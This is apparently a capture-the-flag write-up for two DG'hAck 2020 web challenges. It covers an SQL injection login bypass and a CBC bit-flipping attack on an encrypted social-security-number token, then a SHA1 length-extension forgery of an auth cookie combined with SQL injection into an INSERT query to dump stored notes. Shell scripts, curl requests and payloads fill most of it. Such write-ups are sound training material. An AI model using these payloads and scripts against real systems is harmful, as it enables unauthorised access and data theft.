---
title: "DG'hAck: Sad Crypto and Stickitup"
date: 2020-12-02T13:43:03+01:00
categories:
  - dghack2020
summary: "Another DG'hAck 2020 challenges: sad crypto & stickitup"
---

# Sad Crypto

The challenge is now to retrieve encryption keys from a SSN web service. You'll face a login/password form with a captcha at first. It will be easily breakable using a basic SQL injection. I mean, login `" or 1=1;--`, password `" or 1=1;--` will just work.

Once logged-in, you'll find out you can't query for your target. However, there is quite a few another entries, like `Bruce Wayne`, in the database. Querying for this user will return the encryption key `797b4c-c4bd852fe0e32ebda194cb2a9fe00099`.

Following the requests, you'll find out that it will start by:

```sh
curl 'http://sadcrypto.chall.malicecyber.com/api/v1/validate' \
  -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDYyOTA1NTQsImV4cCI6MTYwNjQ2MzM1NH0.jkPNS-jZT8HzDTsQnu3Clbp4xXiJVZI1dgQNrJCvRgI' \
  --data-raw 'ssn=1-78-67-78-356-789-12'
... snip ...
{"success":true,"message":"","data":{"keyRequest":"33fbce50e4643f46a70a5e9b79d9897937ba685ef43821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4"}}
```

and will continue with

```sh
curl 'http://sadcrypto.chall.malicecyber.com/api/v1/keygen/33fbce50e4643f46a70a5e9b79d9897937ba685ef43821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4' \
  -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDYyOTA1NTQsImV4cCI6MTYwNjQ2MzM1NH0.jkPNS-jZT8HzDTsQnu3Clbp4xXiJVZI1dgQNrJCvRgI'
... snip ...
{"success":true,"message":"","hash":"797b4cc4bd852fe0e32ebda194cb2a9fe00099427615c4aae33ad77c9fa298fd"}
```

If we try with our target SSN (`1-46-85-30-750-318-37`), it will fail:

```sh
$ curl 'http://sadcrypto.chall.malicecyber.com/api/v1/validate'   -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDYyOTA1NTQsImV4cCI6MTYwNjQ2MzM1NH0.jkPNS-jZT8HzDTsQnu3Clbp4xXiJVZI1dgQNrJCvRgI'   --data-raw 'ssn=1-46-85-30-750-318-37'
... snip...
{"success":false,"message":"Cette ressource est verrouillée"}
```

Okay, sad. Let's get back to the last query, and modify a bit, just to find out what it will do:

```sh
$ curl 'http://sadcrypto.chall.malicecyber.com/api/v1/keygen/33fbc750e4643f46a70a5e9b79d9897937ba685ef43821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4'
   -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDYyOTA1NTQsImV4cCI6MTYwNjQ2MzM1NH0.jkPNS-jZT8HzDTsQnu3Clbp4xXiJVZI1dgQNrJCvRgI'
... snip...
{"ssn":"1->8-67-78-356-789-12","success":false,"message":"le numéro de sécurité sociale soumis est invalide"}
```

Oh. It modified the SSN. So, the `keyRequest` field is somewhat linked with SSN. Most likely, the SSN is in fact encrypted. As the SSN is 21 bytes, the keyRequest 48 bytes, and modifying a single bit in the first bytes of the `keyRequest`, than we're facing to some crypto with an IV vulnerable to some bitflipping attack. Modifying more bytes will confirm this, because modifying the 17th byte will rewrite the whole first block, meaning we are facing some CBC block cryptography. `keyRequest` is in the form

```
[.......IV.......][....block 1.....][....block 2.....]
```

Modifying IV will modifying uncrypted block 1 because of CBC (as IV is xoring result of unencryption of block1). Modifying crypted block1 will modify uncrypted block2, and so on. So, to modify the SSN from Bruce Wayne's to our target's, we must flip bits from encrypted 1st block, then flip bits from IVs. To do this, I wrote & used 2 tools:

```sh
$ ./test_crypto 1-78-67-78-356-789-12 33fbce50e4643f46a70a5e9b79d9897937ba685ef43821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4
new: 33fbce50e4643f46a70a5e9b79d98979 3ebb685cf13821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4
```

```sh
$ curl 'http://sadcrypto.chall.malicecyber.com/api/v1/keygen/33fbce50e4643f46a70a5e9b79d989793ebb685cf13821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4'
   -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDYyOTA1NTQsImV4cCI6MTYwNjQ2MzM1NH0.jkPNS-jZT8HzDTsQnu3Clbp4xXiJVZI1dgQNrJCvRgI'
{"ssn":"\u0002ï¿½\u0006ï¿½ï¿½\u000e9Ç®\u0000ï¿½ï¿½S\u0003ï¿½18-37","success":false,"message":"le numéro de sécurité sociale soumis est invalide"}
```

2nd tool will bruteforce again API to find out the first bits to flip:

```sh
$ python bf eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDYyOTA1NTQsImV4cCI6MTYwNjQ2MzM1NH0.jkPNS-jZT8HzDTsQnu3Clbp4xXiJVZI1dgQNrJCvRgI 33fbce50e4643f46a70a5e9b79d989793ebb685cf13821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4

http://sadcrypto.chall.malicecyber.com/api/v1/keygen/00fbce50e4643f46a70a5e9b79d989793ebb685cf13821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4
{"ssn":"1?\u0006??\u000e9?\u0000??S\u0003?18-37","success":false,"message":"le num?ro de s?curit? sociale soumis est invalide"}
00
        ^
...

http://sadcrypto.chall.malicecyber.com/api/v1/keygen/0005fc9e38ce045253940d9b79d989793ebb685cf13821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4
{"ssn":"1-46-85-30S??S\u0003?18-37","success":false,"message":"le num?ro de s?curit? sociale soumis est invalide"}
                  ^
...

http://sadcrypto.chall.malicecyber.com/api/v1/keygen/0005fc9e38ce04525394734983baa79f3ebb685cf13821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4
{"ssn":"1-46-85-30-750-\t18-37","success":false,"message":"le num?ro de s?curit? sociale soumis est invalide"}
                       ^^
http://sadcrypto.chall.malicecyber.com/api/v1/keygen/0005fc9e38ce04525394734983baa7a03ebb685cf13821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4
{"success":true,"message":"","hash":"5c2b14d8b055058bd47fa73de886000eb264281fa5292cdf81dd896541dc1930"}
'ssn'

http://sadcrypto.chall.malicecyber.com/api/v1/keygen/0005fc9e38ce04525394734983baa7a13ebb685cf13821990072643c905b3af5b6fc128c4fef6d8260a52a3f55d358d4
{"success":true,"message":"","hash":"2f4746d53204699f60f2ba0f689bcee2d5ecc8e0c3fa042f883cedb949591e9c"}
'ssn'
```

At the end, we just need to test the last remaining hash (a couple), and once you've got the correct hash, to reformat it to get the flag: `2ed35b-fd91f07094b4447deac135cb8d4b6e45`.


# StickItUp

You're now facing a post-it like website: A registration form, a login form, a page to send write post-its, read them & delete them. Nothing fancy.

In the source code of the main page, we're seeing:

```php
<!-- $_COOKIES['auth'] = 'testuser:' . sha1(SECRET_KEY . 'testuser'); -->
```

This auth cookie is in the auth:hash form. Hash is doing 20 bytes because it is a sha1. It is definitely vulnerable to a [length extension attack](https://en.wikipedia.org/wiki/Length_extension_attack).

Before continuing, we'll retrieve valid cookie value (dump from chrome):

```sh
curl 'http://stickitup.chall.malicecyber.com/notes.php' \
  -H 'Referer: http://stickitup.chall.malicecyber.com/member.php' \
  -H 'Cookie: PHPSESSID=517sutmuivn1u443jh15u2dhu1; auth=testaroo%3A4e481149bcbd121513e4f1a0c2366c96e77bb676' \
  --data-raw 'title=new+note&text=new+content'
```

We'll make use of [hash extender](https://github.com/iagox86/hash_extender) to guess the key size.

```sh
#!/bin/sh

HASHEXT=$HOME/tmp/hash_extender/hash_extender

for i in $(seq 1 30); do
    out=$($HASHEXT -f sha1 -s cbbd5ced55a1924075dca803f727b7f5eaabdf90 -d aaaa0 -a A -l $i --out-data-format=html --table)

    user=$(echo $out | cut -d ' ' -f3)
    sig=$(echo $out | cut -d ' ' -f2)

    curl -s 'http://stickitup.chall.malicecyber.com/member.php' -H "Cookie: PHPSESSID=n4um3fehrhrp0834uidgp7ljj4; auth=$user:$sig" |grep "Add note"
    res=$?
    echo "secret:$i:$res"
done
```

As a result:

```sh
$ sh check_cookie.sh
secret:1:1
secret:2:1
...
secret:15:1
Binary file (standard input) matches
secret:16:0
...
```

Key is 16 bytes long. We just needed that. Now, we can craft any valid username:hash values. As the new user value is trusted by the website, it is still required to find the vulnerability to exploit it using our user. With more research, we find out using `or sleep(1)` in the `username` than the website is vulnerable to a SQL injection in the username:

```sh
testaroo%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%27+or+sleep%281%29+or+%271%27%3d%271:9d156c0f4247f9a3ca6056ccebf7d6c65f26dfb2
```

As we're running this in the `notes.php` query, which creates a post-it, we can safely conclude we're in an `INSERT` query. The query is most likely:

```sql
INSERT INTO posts(alias, title, text) VALUES('testaroo<--- payload --->', 'title', 'note');
```

We can make use of multiple record inserts to add anything we want in the query, like:

```sql
INSERT INTO posts(alias, title, text) VALUES('alias1','title','note'),('alias','title','note'),('alias','title','note');
```

To enable this, we create a quick script

```sh
#!/bin/sh

query=$(echo -n $1 | xxd -p)
query=$1

if test "x$query" = "x"; then
    exit 0
fi

base_user=testaroo
base_pass=4e481149bcbd121513e4f1a0c2366c96e77bb676
base_cookie=517sutmuivn1u443jh15u2dhu1

stuff=$(./hash_extender/hash_extender -f sha1 -s $base_pass -a "$query" -l 16 -d $base_user --out-data-format=html --table)

user=$(echo $stuff|cut -d' ' -f3)
pass=$(echo $stuff|cut -d' ' -f2)

echo $user:$pass

title=title$RANDOM
text=text$RANDOM

echo "Doing: INSERT INTO posts (alias, title, text) VALUES (\"$user\", \"$title\", \"$text\");"

curl -v 'http://stickitup.chall.malicecyber.com/notes.php' \
  -H 'Origin: http://stickitup.chall.malicecyber.com' \
  -H "Cookie: PHPSESSID=${base_cookie}; auth=$user:$pass" \
  --data-raw "title=${title}&text=${text}"

echo; echo; echo

curl -sv 'http://stickitup.chall.malicecyber.com/member.php' --output - \
  -H "Cookie: PHPSESSID=n4um3fehrhrp0834uidgp7ljj4; auth=$user:$pass" |sed -e 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d'

decoded_user=$(echo $user |python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));" 2>/dev/null)

echo "Doing: INSERT INTO posts (alias, title, text) VALUES (\"$decoded_user\", \"$title\", \"$text\");"
```

As a result, we create a new post-it with all values from all existing post-its:

```sh
$ sh query.sh 'a","a","b"),("testaroo", "title", (SELECT titles FROM (SELECT GROUP_CONCAT(content SEPARATOR ",") as titles FROM note) a)),("testaroo'
testaroo%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0a%22%2c%22a%22%2c%22b%22%29%2c%28%22testaroo%22%2c+%22title%22%2c+%28SELECT+titles+FROM+%28SELECT+GROUP%5fCONCAT%28content+SEPARATOR+%22%2c%22%29+as+titles+FROM+note%29+a%29%29%2c%28%22testaroo:8884b6aa3589f5d0ff7beeb72b1b0845f5df55ec
...
Doing: INSERT INTO posts (alias, title, text) VALUES ("testarooï¿½ï¿½a","a","b"),("testaroo",+"title",+(SELECT+titles+FROM+(SELECT+GROUP_CONCAT(content+SEPARATOR+",")+as+titles+FROM+note)+a)),("testaroo", "title11968", "text30311");
```

And checking our post-its, we'll find out that the flag is `-+-{{akUX7Aihx9}}-+-`.
